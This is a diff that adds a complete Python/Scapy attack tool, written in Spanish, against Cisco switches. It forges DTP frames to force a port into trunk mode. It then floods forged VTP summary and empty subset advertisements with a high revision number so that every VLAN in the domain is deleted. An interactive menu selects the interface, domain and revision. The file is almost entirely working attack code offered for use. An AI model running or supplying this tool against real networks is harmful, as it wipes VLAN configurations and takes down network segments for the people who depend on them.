@@ -1,0 +1,162 @@
+#!/usr/bin/env python3
+
+from scapy.all import Ether, LLC, SNAP, Raw, sendp, sniff, get_if_hwaddr, RandMAC
+import struct
+import sys
+import os
+import time
+from datetime import datetime
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 vtp_attack.py")
+        sys.exit(1)
+
+
+def construir_dtp(interfaz, dominio):
+    mac_origen = get_if_hwaddr(interfaz)
+    eth  = Ether(dst="01:00:0c:cc:cc:cc", src=mac_origen)
+    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+    snap = SNAP(OUI=0x00000c, code=0x2004)
+
+    dom_bytes = dominio.encode()
+    payload  = b'\x01'
+    payload += struct.pack('>HH', 0x0001, len(dom_bytes) + 4) + dom_bytes
+    payload += struct.pack('>HHB', 0x0002, 5, 0x03)
+    payload += struct.pack('>HHB', 0x0003, 5, 0xa5)
+    mac_bytes = bytes.fromhex(mac_origen.replace(':', ''))
+    payload += struct.pack('>HH', 0x0004, 10) + mac_bytes
+
+    return eth / llc / snap / Raw(load=payload)
+
+
+def negociar_trunk(interfaz, dominio, duracion):
+    print(f"\n[*] FASE 1: Negociacion DTP de trunk")
+    print(f"[*] Interfaz : {interfaz}")
+    print(f"[*] Dominio  : {dominio}")
+    print(f"[*] Duracion : {duracion}s")
+    print()
+
+    pkt = construir_dtp(interfaz, dominio)
+    inicio = time.time()
+    enviados = 0
+
+    while time.time() - inicio < duracion:
+        sendp(pkt, iface=interfaz, verbose=False)
+        enviados += 1
+        transcurrido = int(time.time() - inicio)
+        print(f"\r[+] [{transcurrido:02d}s] Frames DTP enviados: {enviados}", end="", flush=True)
+        time.sleep(1)
+
+    print(f"\n[+] Negociacion DTP completada. {enviados} frames enviados.")
+    print("[*] El puerto deberia estar en modo trunk ahora.")
+
+
+def construir_vtp_summary(dominio, revision):
+    dom_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
+    ahora = datetime.now()
+    ts = f"{ahora.day:02d}{ahora.month:02d}{ahora.year}{ahora.hour:02d}{ahora.minute:02d}{ahora.second:02d}"
+    timestamp = ts.encode('ascii')[:12].ljust(12, b'\x00')
+
+    payload  = struct.pack('B', 0x02)
+    payload += struct.pack('B', 0x01)
+    payload += struct.pack('B', 0x01)
+    payload += struct.pack('B', len(dominio))
+    payload += dom_bytes
+    payload += struct.pack('>I', revision)
+    payload += bytes([6, 6, 1, 100])
+    payload += timestamp
+    payload += bytes(16)
+    return payload
+
+
+def construir_vtp_subset_vacio(dominio, revision):
+    dom_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
+    payload  = struct.pack('B', 0x02)
+    payload += struct.pack('B', 0x02)
+    payload += struct.pack('B', 0x01)
+    payload += struct.pack('B', len(dominio))
+    payload += dom_bytes
+    payload += struct.pack('>I', revision)
+    return payload
+
+
+def encapsular(payload):
+    eth  = Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC())
+    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+    snap = SNAP(OUI=0x00000c, code=0x2003)
+    return bytes(eth / llc / snap) + payload
+
+
+def ataque_vtp(interfaz, dominio, revision):
+    print(f"\n[*] FASE 2: Ataque VTP (borrado de VLANs)")
+    print(f"[*] Dominio  : {dominio}")
+    print(f"[*] Revision : {revision}")
+    print()
+
+    sum_frame    = encapsular(construir_vtp_summary(dominio, revision))
+    subset_frame = encapsular(construir_vtp_subset_vacio(dominio, revision))
+
+    for i in range(5):
+        sendp(Raw(load=sum_frame), iface=interfaz, verbose=False)
+        time.sleep(0.1)
+        sendp(Raw(load=subset_frame), iface=interfaz, verbose=False)
+        print(f"[+] Ronda {i+1}/5: Summary + Subset enviados")
+        time.sleep(0.5)
+
+    print("\n[+] Ataque VTP completado.")
+    print("[*] Verifica en el switch: show vlan brief")
+
+
+def menu():
+    print("=" * 55)
+    print("     ATAQUE VTP - BORRADO DE VLANs")
+    print("=" * 55)
+    print()
+    print("[*] Modos disponibles:")
+    print("    1. Solo DTP (negociar trunk)")
+    print("    2. Ataque completo (DTP + VTP)")
+    print()
+
+    while True:
+        modo = input("[?] Selecciona el modo (1 o 2): ").strip()
+        if modo in ("1", "2"):
+            break
+        print("[!] Opcion invalida.")
+
+    interfaz = input("[?] Interfaz de red (ej: eth1)         : ").strip() or "eth1"
+    dominio  = input("[?] Dominio VTP (ej: elianny.local)    : ").strip() or "elianny.local"
+
+    revision = 0
+    if modo == "2":
+        while True:
+            try:
+                revision = int(input("[?] Numero de revision (ej: 9999)      : ").strip() or "9999")
+                break
+            except ValueError:
+                print("[!] Ingresa un numero valido.")
+
+    return modo, interfaz, dominio, revision
+
+
+def main():
+    verificar_root()
+    modo, interfaz, dominio, revision = menu()
+
+    confirmar = input("\n[?] Iniciar ataque? (s/n): ").strip().lower()
+    if confirmar != "s":
+        print("[*] Cancelado.")
+        sys.exit(0)
+
+    if modo == "1":
+        negociar_trunk(interfaz, dominio, 30)
+    else:
+        negociar_trunk(interfaz, dominio, 25)
+        print("\n[*] Esperando 5s para estabilizar el trunk...")
+        time.sleep(5)
+        ataque_vtp(interfaz, dominio, revision)
+
+
+if __name__ == "__main__":
+    main()
